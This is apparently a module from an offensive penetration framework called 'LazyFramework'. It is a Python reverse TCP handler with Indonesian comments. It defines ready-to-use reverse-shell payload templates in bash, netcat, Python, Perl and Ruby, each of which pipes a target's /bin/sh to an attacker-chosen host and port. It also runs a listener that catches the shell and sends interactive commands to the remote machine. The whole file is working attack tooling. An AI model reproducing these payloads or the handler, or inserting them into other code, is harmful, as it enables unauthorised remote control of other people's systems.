#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import uuid
from typing import Dict, Any

# === MODULE METADATA (PAKAI DOUBLE QUOTE SAJA) ===
MODULE_INFO = {
    "name": "Reverse TCP Handler",
    "author": "LazyFramework",
    "description": "Universal reverse TCP listener with Sessions tab support",
    "rank": "Excellent",
    "platform": "multi",
    "arch": "multi",
    "dependencies": [],
    "references": []
}

# === OPTIONS (PAKAI DOUBLE QUOTE SAJA) ===
OPTIONS = {
    "LHOST": {
        "description": "Local IP to listen on",
        "required": True,
        "default": "0.0.0.0"
    },
    "LPORT": {
        "description": "Local port to listen on",
        "required": True,
        "default": "4444"
    },
    "PAYLOAD": {
        "description": "Payload type: bash, nc, python, perl, ruby",
        "required": False,
        "default": "bash"
    },
    "TIMEOUT": {
        "description": "Listener timeout (0 = no timeout)",
        "required": False,
        "default": "300"
    }
}

# === Payload Templates ===
PAYLOADS = {
    "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    "nc": 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f',
    "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "perl": 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)))&&open(STDIN,">&S")&&open(STDOUT,">&S")&&open(STDERR,">&S")&&exec("/bin/sh -i");\'',
    "ruby": 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
}

# === Output ke Sessions Tab (GUI) atau Console ===
def log(session: Dict, sid: str, text: str):
    gui = session.get("gui_instance")
    if gui and hasattr(gui, "append_session_output"):
        gui.append_session_output(sid, text)
    else:
        try:
            from rich.console import Console
            Console().print(text)
        except:
            print(text)

# === Generate Payload ===
def generate_payload(opts: Dict) -> str:
    t = opts.get("PAYLOAD", "bash").lower()
    return PAYLOADS.get(t, PAYLOADS["bash"]).format(**opts)

# === Listener Thread ===
def listener(session: Dict, opts: Dict):
    sid = str(uuid.uuid4())[:8]
    host, port = opts["LHOST"], int(opts["LPORT"])
    timeout = int(opts.get("TIMEOUT", 300))

    # Tambah session ke GUI
    gui = session.get("gui_instance")
    if gui and hasattr(gui, "add_session"):
        gui.add_session(sid, host, port, "reverse_tcp", opts.get("PAYLOAD", "bash"))

    log(session, sid, f"[*] Starting listener: {host}:{port}")
    log(session, sid, f"[*] Payload: {opts.get('PAYLOAD')}")
    log(session, sid, f"[*] Command:\n[bold cyan]    {generate_payload(opts)}[/]\n")

    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        if timeout > 0:
            s.settimeout(timeout)
        log(session, sid, f"[+] Waiting..." + (f" ({timeout}s)" if timeout > 0 else ""))

        conn, addr = s.accept()
        log(session, sid, f"\n[bold green][+] Connected from {addr[0]}[/]\n")
        if gui and hasattr(gui, "update_session_status"):
            gui.update_session_status(sid, "active", addr[0])

        def recv():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data: break
                    log(session, sid, data.decode("utf-8", "ignore").rstrip())
                except: break
        threading.Thread(target=recv, daemon=True).start()

        while True:
            cmd = input(f"[sess:{sid}] {addr[0]} > ")
            if cmd.lower() in ["exit", "quit"]: break
            if cmd.strip():
                conn.send(cmd.encode() + b'\n')

        conn.close()
        s.close()
        log(session, sid, "\n[bold yellow][*] Session closed.[/]")
        if gui and hasattr(gui, "update_session_status"):
            gui.update_session_status(sid, "closed")

    except socket.timeout:
        log(session, sid, f"\n[bold red][!] Timeout after {timeout}s[/]")
    except Exception as e:
        log(session, sid, f"\n[bold red][!] Error: {e}[/]")
    finally:
        try: s.close()
        except: pass

# === Main Run ===
def run(session: Dict, options: Dict):
    for req in ["LHOST", "LPORT"]:
        if not options.get(req):
            gui = session.get("gui_instance")
            if gui and hasattr(gui, "append_output"):
                gui.append_output(f"[bold red][!] Missing option: {req}[/]")
            return

    threading.Thread(target=listener, args=(session, options), daemon=True).start()
